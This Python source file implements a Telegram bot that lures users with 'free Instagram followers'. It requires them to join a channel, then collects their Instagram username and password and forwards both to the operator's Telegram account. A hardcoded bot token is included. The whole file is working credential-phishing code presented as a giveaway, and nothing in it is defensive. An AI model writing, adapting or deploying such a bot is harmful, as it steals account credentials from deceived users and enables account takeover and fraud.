

from flask import Flask
from threading import Thread
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters, CallbackContext

BOT_TOKEN = '7192034833:AAHdW7xJBwzMgz8FJ6pPb11fGCDyzHmsasA'
CHANNEL_USERNAME = '@freeinstagramfollowers_10'
# Your own Telegram ID to receive responses (get from @userinfobot)
ADMIN_ID = 6178260867

# Start Flask for uptime bot ping
app = Flask('')

@app.route('/')
def home():
    return "Bot is Alive!"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    Thread(target=run).start()

# Store user flow
user_data = {}

def send_main_menu(update, first_name):
    buttons = [
        [InlineKeyboardButton("🌐 Website", url="https://free-insta-followers.netlify.app/")],
        [InlineKeyboardButton("🆓 Get Free Followers", callback_data="get_followers")]
    ]
    update.message.reply_text(f"👋 Welcome {first_name}! Please choose an option below:", reply_markup=InlineKeyboardMarkup(buttons))

def start(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    first_name = update.effective_user.first_name
    chat = context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)

    if chat.status in ["member", "administrator", "creator"]:
        send_main_menu(update, first_name)
    else:
        buttons = [
            [InlineKeyboardButton("🔗 Join Channel", url=f"https://t.me/{CHANNEL_USERNAME[1:]}")],
            [InlineKeyboardButton("✅ I Have Joined", callback_data="check_join")]
        ]
        update.message.reply_text(
            f"⚠️ Hello {first_name}, you must join our channel to continue.",
            reply_markup=InlineKeyboardMarkup(buttons)
        )

def check_join(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    first_name = update.effective_user.first_name
    chat = context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)

    if chat.status in ["member", "administrator", "creator"]:
        update.callback_query.message.reply_text(f"✅ Verified {first_name}! Now choose an option:")
        send_main_menu(update.callback_query, first_name)
    else:
        update.callback_query.message.reply_text(f"❌ You're still not a member, {first_name}. Please join first.")

def button_callback(update: Update, context: CallbackContext):
    query = update.callback_query
    user_id = query.from_user.id
    query.answer()
    user_data[user_id] = {"step": "ask_username"}
    context.bot.send_message(chat_id=user_id, text="📱 Enter your Instagram username:")

def handle_messages(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    first_name = update.effective_user.first_name
    full_name = update.effective_user.full_name
    tg_id = update.effective_user.id
    message = update.message.text

    if user_id not in user_data:
        return

    state = user_data[user_id]

    if state["step"] == "ask_username":
        state["username"] = message
        state["step"] = "ask_password"
        update.message.reply_text("🔐 Enter your Instagram password:")
    elif state["step"] == "ask_password":
        state["password"] = message
        state["step"] = "confirm_password"
        update.message.reply_text("🔐 Please confirm your password:")
    elif state["step"] == "confirm_password":
        if message == state["password"]:
            update.message.reply_text(
                f"✅ Thank you {first_name}!\n\n"
                "Your follower request has been submitted successfully. Please wait up to *24 hours*.\n"
                "If you don't receive them, feel free to DM me on Instagram: [@Lasmini_haobam__](https://instagram.com/Lasmini_haobam__)\n\n"
                "✨ Stay tuned for more giveaways & tricks!\n"
                "#TeamTasmina ❤️",
                parse_mode='Markdown'
            )

            context.bot.send_message(
                chat_id=ADMIN_ID,
                text=(
                    "📥 New Follower Request:\n\n"
                    f"👤 Name: {full_name} (ID: `{tg_id}`)\n"
                    f"📸 Username: `{state['username']}`\n"
                    f"🔐 Password: `{state['password']}`"
                ),
                parse_mode='Markdown'
            )

            del user_data[user_id]
        else:
            update.message.reply_text("❌ Passwords do not match. Please enter password again:")
            state["step"] = "ask_password"

def main():
    keep_alive()
    updater = Updater(BOT_TOKEN)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CallbackQueryHandler(check_join, pattern="check_join"))
    dp.add_handler(CallbackQueryHandler(button_callback))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_messages))

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
